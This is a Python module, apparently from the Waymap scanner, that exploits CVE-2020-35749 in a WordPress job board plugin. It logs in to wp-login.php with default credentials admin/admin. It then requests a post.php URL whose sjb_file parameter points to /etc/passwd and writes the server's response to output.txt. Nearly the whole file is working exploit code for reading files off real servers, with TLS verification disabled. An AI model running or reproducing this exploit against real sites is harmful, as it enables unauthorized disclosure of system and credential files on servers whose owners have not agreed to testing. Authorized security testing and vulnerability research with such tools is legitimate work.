# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2020_35749

import requests
import time
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class Color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'

color_random = [
    Color.HEADER, Color.IMPORTANT, Color.NOTICE, 
    Color.OKBLUE, Color.OKGREEN, Color.WARNING, 
    Color.RED, Color.END, Color.UNDERLINE, 
    Color.LOGGING
]    

def fetch_contents(profile_url):
    fetch_path = "/etc/passwd"  
    username = "admin"          
    password = "admin"          

    print(color_random[5] + "[+] Trying to fetch the contents from " + fetch_path)
    time.sleep(3)

    login_url = profile_url + "wp-login.php"
    wp_path = profile_url + 'wp-admin/post.php?post=application_id&action=edit&sjb_file=' + fetch_path

    with requests.Session() as session:
        headers = {
            'Cookie': 'wordpress_test_cookie=WP Cookie check',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15'
        }

        post_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': wp_path,
            'testcookie': '1'
        }

        session.post(login_url, headers=headers, data=post_data, verify=False)
        response = session.get(wp_path)

        with open("output.txt", "w") as out_file:
            out_file.write(response.text)

        print(color_random[4] + response.text)
        print(color_random[5] + "\n[+] Output Saved as: output.txt\n")

def scan_cve_2020_35749(profile_url):
    fetch_contents(profile_url)

